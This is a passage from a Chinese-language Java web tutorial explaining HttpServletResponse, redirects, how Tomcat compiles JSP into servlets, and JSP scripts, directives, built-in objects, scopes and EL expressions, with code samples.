<span class="hljs-variable">userId</span> <span class="hljs-operator">=</span> req.getParameter(<span class="hljs-string">&quot;userId&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">classId</span> <span class="hljs-operator">=</span> req.getParameter(<span class="hljs-string">&quot;classId&quot;</span>);<br>        resp.getWriter().write(<span class="hljs-string">&quot;userId = &quot;</span> + userId + <span class="hljs-string">&quot; classId = &quot;</span> + classId);<br>    &#125;<br><br>    <br>&#125;<br></code></pre></td></tr></table></figure><p>Servlet 可正常获取数据</p><p><img src="/image/image-20230720215038743.png" alt="image-20230720215038743"></p><h2 id="4、HttpServletResponse"><a href="#4、HttpServletResponse" class="headerlink" title="4、HttpServletResponse"></a>4、HttpServletResponse</h2><h3 id="4-1、核心方法"><a href="#4-1、核心方法" class="headerlink" title="4.1、核心方法"></a>4.1、核心方法</h3><p>存在以下核心方法：</p><ul><li><p><code>void sendRedirect(String location)</code>：返回一个重定向的响应，不是 set，而是 send，3xx 开头的响应。浏览器会自动的跳转到对应的新页面，<code>String location</code>就是你要跳转到的页面。</p></li><li><p><code>PrintWriter getWriter()</code>：得到字符流</p></li><li><p><code>OutputStream getOutputStream()</code>：得到字节流</p></li></ul><h3 id="4-2、设置状态码及重定向"><a href="#4-2、设置状态码及重定向" class="headerlink" title="4.2、设置状态码及重定向"></a>4.2、设置状态码及重定向</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.servlet.ServletException;<br><span class="hljs-keyword">import</span> javax.servlet.annotation.WebServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-meta">@WebServlet(&quot;/redirect&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RedirectServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        <span class="hljs-comment">// 设置状态码</span><br>        resp.setStatus(<span class="hljs-number">302</span>);<br>        <span class="hljs-comment">// 重定向</span><br>        resp.setHeader(<span class="hljs-string">&quot;Location&quot;</span>,<span class="hljs-string">&quot;https://cn.bing.com&quot;</span>);<br>    &#125;<br>    <br>&#125;<br></code></pre></td></tr></table></figure><p>可正常重定向</p><p><img src="/image/image-20230720220204179.png" alt="image-20230720220204179"></p><h1 id="三、JSP"><a href="#三、JSP" class="headerlink" title="三、JSP"></a>三、JSP</h1><h2 id="1、简介-1"><a href="#1、简介-1" class="headerlink" title="1、简介"></a>1、简介</h2><p>JSP 全称 JavaServer Pages 基于Java语言，是一种动态网页技术，与 PHP、ASP、ASP.NET 等类似的脚本语言，JSP是为了简化Servlet的处理流程而出现的替代品，早期的Java EE因为只能使用Servlet来处理客户端请求而显得非常的繁琐和不便，使用JSP可以快速的完成后端逻辑请求。使用JSP标签在HTML网页中插入Java代码，标签通常以<code>&lt;%</code>开头 以<code>%&gt;</code>结束，JSP本质是简化版的Servlet，JSP在编译后就变成了Servlet，由于JVM只能识别 Java 类，无法识别JSP代码。故WEB服务器会将 JSP 编译为 JVM 能识别的Java类。</p><p>JSP 与 Servlet区别在于，JSP常用于动态页面显示，Servlet 常用于逻辑控制。在代码中常使用 JSP 做前端动态页面，在接收到用户输入后交给对应的 Servlet 进行处理(JSP也可以当做后端代码进行逻辑控制)。</p><p>因为在JSP中可以直接调用Java代码来实现后端逻辑的这一特性，黑客通常会编写带有恶意攻击的JSP文件(俗称WebShell)来实现对服务器资源的恶意请求和控制。</p><p>现代的MVC框架(如：Spring MVC 5.x)已经完全抛弃了JSP技术，采用了模板引擎(如：Freemark)或者RESTful的方式来实现与客户端的交互工作, 总结来说 JSP 已被慢慢淘汰。</p><h2 id="2、JSP原理"><a href="#2、JSP原理" class="headerlink" title="2、JSP原理"></a>2、JSP原理</h2><p>JSP 本质上是简化版的 Servlet，由于 JVM 无法识别JSP，故 WEB 服务器会将 JSP 编译为可识别的 .java 文件，从业务来说 JSP 常用于动态页面显示，Servlet 常用于逻辑控制即 JSP 通常作为前端动态页面，Servlet通常做为后端代码进行逻辑控制。</p><p>index.jsp</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;html&gt;<br>&lt;body&gt;<br>&lt;h2&gt;Hello World!&lt;/h2&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>启动 Tomcat</p><p><img src="/image/image-20230721201019400.png" alt="image-20230721201019400"></p><p>查看 idea 项目文件 <code>C:\Users\bai\AppData\Local\JetBrains\IntelliJIdea2022.2\tomcat\349ec0f9-08df-4618-8b09-2f49abd43030\work\Catalina\localhost\demo_war\org\apache\jsp</code> 存在文件index_jsp.java、index_jsp.class</p><p><img src="/image/image-20230721201138112.png" alt="image-20230721201138112"></p><p>编译过程如下：</p><p>浏览器第一次请求 index.jsp，Tomcat 将index.jsp转化成 index._jsp.java ，并将该文件编译成class文件，编译完毕后运行 class 文件响应浏览器请求；同时对 index.jsp 进行监听，若 index.jsp 存在改动则重新编译 ；后续访问 index.jsp 将直接调用 class 进行响应。</p><p>index._jsp.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Generated by the Jasper component of Apache Tomcat</span><br><span class="hljs-comment"> * Version: Apache Tomcat/9.0.78</span><br><span class="hljs-comment"> * Generated at: 2023-07-21 12:09:36 UTC</span><br><span class="hljs-comment"> * Note: The last modified time of this file was set to</span><br><span class="hljs-comment"> *       the last modified time of the source file after</span><br><span class="hljs-comment"> *       generation to assist with modification tracking.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">package</span> org.apache.jsp;<br><br><span class="hljs-keyword">import</span> javax.servlet.*;<br><span class="hljs-keyword">import</span> javax.servlet.http.*;<br><span class="hljs-keyword">import</span> javax.servlet.jsp.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">index_jsp</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">org</span>.apache.jasper.runtime.HttpJspBase<br>    <span class="hljs-keyword">implements</span> <span class="hljs-title class_">org</span>.apache.jasper.runtime.JspSourceDependent,<br>                 org.apache.jasper.runtime.JspSourceImports &#123;<br><br>  <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> javax.servlet.jsp.<span class="hljs-type">JspFactory</span> <span class="hljs-variable">_jspxFactory</span> <span class="hljs-operator">=</span><br>          javax.servlet.jsp.JspFactory.getDefaultFactory();<br><br>  <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> java.util.Map&lt;java.lang.String,java.lang.Long&gt; _jspx_dependants;<br><br>  <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> java.util.Set&lt;java.lang.String&gt; _jspx_imports_packages;<br><br>  <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> java.util.Set&lt;java.lang.String&gt; _jspx_imports_classes;<br><br>  <span class="hljs-keyword">static</span> &#123;<br>    _jspx_imports_packages = <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.util.HashSet&lt;&gt;();<br>    _jspx_imports_packages.add(<span class="hljs-string">&quot;javax.servlet&quot;</span>);<br>    _jspx_imports_packages.add(<span class="hljs-string">&quot;javax.servlet.http&quot;</span>);<br>    _jspx_imports_packages.add(<span class="hljs-string">&quot;javax.servlet.jsp&quot;</span>);<br>    _jspx_imports_classes = <span class="hljs-literal">null</span>;<br>  &#125;<br><br>  <span class="hljs-keyword">private</span> <span class="hljs-keyword">volatile</span> javax.el.ExpressionFactory _el_expressionfactory;<br>  <span class="hljs-keyword">private</span> <span class="hljs-keyword">volatile</span> org.apache.tomcat.InstanceManager _jsp_instancemanager;<br><br>  <span class="hljs-keyword">public</span> java.util.Map&lt;java.lang.String,java.lang.Long&gt; getDependants() &#123;<br>    <span class="hljs-keyword">return</span> _jspx_dependants;<br>  &#125;<br><br>  <span class="hljs-keyword">public</span> java.util.Set&lt;java.lang.String&gt; getPackageImports() &#123;<br>    <span class="hljs-keyword">return</span> _jspx_imports_packages;<br>  &#125;<br><br>  <span class="hljs-keyword">public</span> java.util.Set&lt;java.lang.String&gt; getClassImports() &#123;<br>    <span class="hljs-keyword">return</span> _jspx_imports_classes;<br>  &#125;<br><br>  <span class="hljs-keyword">public</span> javax.el.ExpressionFactory <span class="hljs-title function_">_jsp_getExpressionFactory</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">if</span> (_el_expressionfactory == <span class="hljs-literal">null</span>) &#123;<br>      <span class="hljs-keyword">synchronized</span> (<span class="hljs-built_in">this</span>) &#123;<br>        <span class="hljs-keyword">if</span> (_el_expressionfactory == <span class="hljs-literal">null</span>) &#123;<br>          _el_expressionfactory = _jspxFactory.getJspApplicationContext(getServletConfig().getServletContext()).getExpressionFactory();<br>        &#125;<br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> _el_expressionfactory;<br>  &#125;<br><br>  <span class="hljs-keyword">public</span> org.apache.tomcat.InstanceManager <span class="hljs-title function_">_jsp_getInstanceManager</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">if</span> (_jsp_instancemanager == <span class="hljs-literal">null</span>) &#123;<br>      <span class="hljs-keyword">synchronized</span> (<span class="hljs-built_in">this</span>) &#123;<br>        <span class="hljs-keyword">if</span> (_jsp_instancemanager == <span class="hljs-literal">null</span>) &#123;<br>          _jsp_instancemanager = org.apache.jasper.runtime.InstanceManagerFactory.getInstanceManager(getServletConfig());<br>        &#125;<br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> _jsp_instancemanager;<br>  &#125;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">_jspInit</span><span class="hljs-params">()</span> &#123;<br>  &#125;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">_jspDestroy</span><span class="hljs-params">()</span> &#123;<br>  &#125;<br><br>  <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">_jspService</span><span class="hljs-params">(<span class="hljs-keyword">final</span> javax.servlet.http.HttpServletRequest request, <span class="hljs-keyword">final</span> javax.servlet.http.HttpServletResponse response)</span><br>      <span class="hljs-keyword">throws</span> java.io.IOException, javax.servlet.ServletException &#123;<br><br>    <span class="hljs-keyword">if</span> (!javax.servlet.DispatcherType.ERROR.equals(request.getDispatcherType())) &#123;<br>      <span class="hljs-keyword">final</span> java.lang.<span class="hljs-type">String</span> <span class="hljs-variable">_jspx_method</span> <span class="hljs-operator">=</span> request.getMethod();<br>      <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;OPTIONS&quot;</span>.equals(_jspx_method)) &#123;<br>        response.setHeader(<span class="hljs-string">&quot;Allow&quot;</span>,<span class="hljs-string">&quot;GET, HEAD, POST, OPTIONS&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>      &#125;<br>      <span class="hljs-keyword">if</span> (!<span class="hljs-string">&quot;GET&quot;</span>.equals(_jspx_method) &amp;&amp; !<span class="hljs-string">&quot;POST&quot;</span>.equals(_jspx_method) &amp;&amp; !<span class="hljs-string">&quot;HEAD&quot;</span>.equals(_jspx_method)) &#123;<br>        response.setHeader(<span class="hljs-string">&quot;Allow&quot;</span>,<span class="hljs-string">&quot;GET, HEAD, POST, OPTIONS&quot;</span>);<br>        response.sendError(HttpServletResponse.SC_METHOD_NOT_ALLOWED, <span class="hljs-string">&quot;JSP 只允许 GET、POST 或 HEAD。Jasper 还允许 OPTIONS&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>      &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// jsp 内置对象</span><br>    <span class="hljs-keyword">final</span> javax.servlet.jsp.PageContext pageContext;<br>    javax.servlet.http.<span class="hljs-type">HttpSession</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">final</span> javax.servlet.ServletContext application;<br>    <span class="hljs-keyword">final</span> javax.servlet.ServletConfig config;<br>    javax.servlet.jsp.<span class="hljs-type">JspWriter</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">final</span> java.lang.<span class="hljs-type">Object</span> <span class="hljs-variable">page</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>;<br>    javax.servlet.jsp.<span class="hljs-type">JspWriter</span> <span class="hljs-variable">_jspx_out</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>    javax.servlet.jsp.<span class="hljs-type">PageContext</span> <span class="hljs-variable">_jspx_page_context</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br><span class="hljs-comment">// jsp 中代码转换为相应 java 代码</span><br>    <span class="hljs-keyword">try</span> &#123;<br>      response.setContentType(<span class="hljs-string">&quot;text/html&quot;</span>);<br>      pageContext = _jspxFactory.getPageContext(<span class="hljs-built_in">this</span>, request, response,<br>      <span class="hljs-literal">null</span>, <span class="hljs-literal">true</span>, <span class="hljs-number">8192</span>, <span class="hljs-literal">true</span>);<br>      _jspx_page_context = pageContext;<br>      application = pageContext.getServletContext();<br>      config = pageContext.getServletConfig();<br>      session = pageContext.getSession();<br>      out = pageContext.getOut();<br>      _jspx_out = out;<br><br>      out.write(<span class="hljs-string">&quot;&lt;html&gt;\r\n&quot;</span>);<br>      out.write(<span class="hljs-string">&quot;&lt;body&gt;\r\n&quot;</span>);<br>      out.write(<span class="hljs-string">&quot;&lt;h2&gt;Hello World!&lt;/h2&gt;\r\n&quot;</span>);<br>      out.write(<span class="hljs-string">&quot;&lt;/body&gt;\r\n&quot;</span>);<br>      out.write(<span class="hljs-string">&quot;&lt;/html&gt;\r\n&quot;</span>);<br>    &#125; <span class="hljs-keyword">catch</span> (java.lang.Throwable t) &#123;<br>      <span class="hljs-keyword">if</span> (!(t <span class="hljs-keyword">instanceof</span> javax.servlet.jsp.SkipPageException))&#123;<br>        out = _jspx_out;<br>        <span class="hljs-keyword">if</span> (out != <span class="hljs-literal">null</span> &amp;&amp; out.getBufferSize() != <span class="hljs-number">0</span>)<br>          <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">if</span> (response.isCommitted()) &#123;<br>              out.flush();<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>              out.clearBuffer();<br>            &#125;<br>          &#125; <span class="hljs-keyword">catch</span> (java.io.IOException e) &#123;&#125;<br>        <span class="hljs-keyword">if</span> (_jspx_page_context != <span class="hljs-literal">null</span>) _jspx_page_context.handlePageException(t);<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServletException</span>(t);<br>      &#125;<br>    &#125; <span class="hljs-keyword">finally</span> &#123;<br>      _jspxFactory.releasePageContext(_jspx_page_context);<br>    &#125;<br>  &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>index_jsp.java 继承于 HttpJspBase 类，HttpJspBase 是一个实现了 HttpJspPage 接口并继承了 HttpServlet 的标准的Servlet，jspService 方法其实是 HttpJspPage 接口方法，类似于 Servlet 中的 service 方法，这里的 _jspService方法其实就是HttpJspBase的service方法调用。</p><h2 id="3、JSP脚本"><a href="#3、JSP脚本" class="headerlink" title="3、JSP脚本"></a>3、JSP脚本</h2><p>JSP 脚本就是 JSP 页面中的 java 代码，也叫做scriptlet。JSP 的脚本必须使用<code>&lt;% %&gt;</code>括起来，不然会将当成是模板数据即当做 HTMl 代码进行解析</p><p>JSP脚本存在以下三种方式</p><ul><li>&lt;%%&gt;定义局部变量，编写语句，可用<code>&lt;jsp:scriptlet&gt;&lt;/jsp:scriptlet&gt;</code>替代</li><li>&lt;%!%&gt;   定义类或方法(极少使用)</li><li>&lt;%&#x3D;%&gt; 输出各种类型的变量，int、double、String、Object等， 也称为表达式输出</li></ul><h2 id="4、JSP指令"><a href="#4、JSP指令" class="headerlink" title="4、JSP指令"></a>4、JSP指令</h2><h3 id="4-1、"><a href="#4-1、" class="headerlink" title="4.1、&lt;%@ page … %&gt;"></a>4.1、&lt;%@ page … %&gt;</h3><p>定义网页依赖属性，比如脚本语言、error页面、缓存需求等等</p><ul><li><p>session&#x3D;”true | false”          </p></li><li><p>errorPage&#x3D;”relative_url”              设置报错跳转页面，配合 isErrorPage 使用</p></li><li><p>isErrorPage&#x3D;”true | false”           设置页面是否为 isErrorPage</p></li><li><p>contentType&#x3D;”text&#x2F;html;charset&#x3D;UTF-8”</p></li><li><p>pageEncoding&#x3D;”characterSet “</p></li><li><p>isELIgnored&#x3D;”true | false”</p></li></ul><h3 id="4-2、"><a href="#4-2、" class="headerlink" title="4.2、&lt;%@ include … %&gt;"></a>4.2、&lt;%@ include … %&gt;</h3><p>包含其他文件（静态包含）</p><h3 id="4-3、"><a href="#4-3、" class="headerlink" title="4.3、&lt;%@ taglib … %&gt;"></a>4.3、&lt;%@ taglib … %&gt;</h3><p>引入标签库的定义，taglib指令就是用来指明JSP页面内使用标签库技术</p><h2 id="5、JSP内置对象"><a href="#5、JSP内置对象" class="headerlink" title="5、JSP内置对象"></a>5、JSP内置对象</h2><p>JSP存在以下九大内置对象</p><table><thead><tr><th>变量名</th><th>类型</th><th>作用</th></tr></thead><tbody><tr><td>pageContext</td><td>PageContext</td><td>当前页面编译后的内容，可以获取其他8个内置对象</td></tr><tr><td>request</td><td>HttpServletRequest</td><td>客户端请求对象，包含了所有客户端请求信息</td></tr><tr><td>session</td><td>HttpSession</td><td>请求会话</td></tr><tr><td>application</td><td>ServletContext</td><td>全局对象，所有用户间共享数据</td></tr><tr><td>response</td><td>HttpServletResponse</td><td>响应对象，主要用于服务器端设置响应信息</td></tr><tr><td>page</td><td>Object</td><td>当前Servlet对象,<code>this</code></td></tr><tr><td>out</td><td>JspWriter</td><td>输出对象，数据输出到页面上</td></tr><tr><td>config</td><td>ServletConfig</td><td>Servlet的配置对象</td></tr><tr><td>exception</td><td>Throwable</td><td>异常对象</td></tr></tbody></table><h2 id="6、域对象"><a href="#6、域对象" class="headerlink" title="6、域对象"></a>6、域对象</h2><p>pageContext、request、session、ServletContext作为域对象均存在以下三个方法：</p><ul><li><p>setAttribute(String name,Objcet o)</p></li><li><p>getAttribute(String name)</p></li><li><p>removeAttribute(String name)</p></li></ul><p>pageContext 本质上代表的是当前JSP页面编译后的内容，作为域对象而言，仅代表当前 JSP 页面，即 pageContext 域对象只在 page 范围内有效，超出 page 范围将失效</p><p>同一 page 页面内使用</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>  &lt;title&gt;使用page域对象&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;%<br>  pageContext.setAttribute(<span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-string">&quot;baigeixinan&quot;</span>);<br>%&gt;<br>&lt;%<br>  <span class="hljs-type">String</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> (String) pageContext.getAttribute(<span class="hljs-string">&quot;name&quot;</span>);<br>%&gt;<br>&lt;%= value%&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>可正常使用</p><p><img src="/image/image-20230721212519030.png" alt="image-20230721212519030"></p><p>尝试跨域获取</p><p>test2.jsp</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>  &lt;title&gt;request域对象设置属性&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;%<br>  <span class="hljs-comment">//这是request域对象保存的内容</span><br>  request.setAttribute(<span class="hljs-string">&quot;name&quot;</span>,<span class="hljs-string">&quot;zhongfucheng&quot;</span>);<br>%&gt;<br><br>&lt;%--跳转test3.jsp--%&gt;<br>&lt;jsp:forward page=<span class="hljs-string">&quot;test3.jsp&quot;</span>/&gt;<br><br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>test3.jsp</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;title&gt;Title&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br><br>&lt;%<br><br>  <span class="hljs-type">String</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> (String) pageContext.getAttribute(<span class="hljs-string">&quot;name&quot;</span>);<br><br>%&gt;<br>&lt;%= value%&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>获取失败</p><p><img src="/image/image-20230721212735618.png" alt="image-20230721212735618"></p><p>pageContext对象重载了setAttribute()、getAttribute()、removeAttribute()三个方法，添加了一个设置域范围的一个参数，如果不指定默认为 page</p><ul><li><p>getAttribute(String name,int scope)</p></li><li><p>setAttribute(String name,Object value,int scope)</p></li><li><p>removeAttribute(String name,int scope)</p></li></ul><p>pageContext把request、session、application、page这几个域对象封装着了静态变量供我们使用。</p><ul><li><p>PageContext.APPLICATION_SCOPE</p></li><li><p>PageContext.SESSION_SCOPE</p></li><li><p>PageContext.REQUEST_SCOPE</p></li><li><p>PageContext.PAGE_SCOPE</p></li></ul><p>修改 test3.jsp 如下：</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;title&gt;Title&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br><br>&lt;%<br>  <span class="hljs-type">String</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> (String) pageContext.getAttribute(<span class="hljs-string">&quot;name&quot;</span>,pageContext.REQUEST_SCOPE);<br><br>%&gt;<br>&lt;%= value%&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>可成功获取</p><p><img src="/image/image-20230721213441854.png" alt="image-20230721213441854"></p><p>4中属性范围如下：</p><ul><li><p>page【只在一个页面中保存属性，跳转页面无效】</p></li><li><p>requet【只在一次请求中保存属性，服务器跳转有效，浏览器跳转无效】</p></li><li><p>session【在一个会话范围中保存属性，无论何种跳转均有效，关闭浏览器后无效】</p></li><li><p>application【在整个服务器中保存，所有用户都可以使用】</p></li></ul><h2 id="7、EL表达式"><a href="#7、EL表达式" class="headerlink" title="7、EL表达式"></a>7、EL表达式</h2><p>表达式语言（Expression Language，EL）,EL表达式是用”${}”括起来的脚本，EL表达式主要用来读取数据，进行内容显示。</p><h2 id="8、JSP-demo"><a href="#8、JSP-demo" class="headerlink" title="8、JSP demo"></a>8、JSP demo</h2><p>login.html</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;html&gt;<br>&lt;head&gt;<br>    &lt;title&gt;登录页&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br> &lt;meta http-equiv=<span class="hljs-string">&quot;Content-Type&quot;</span> content=<span 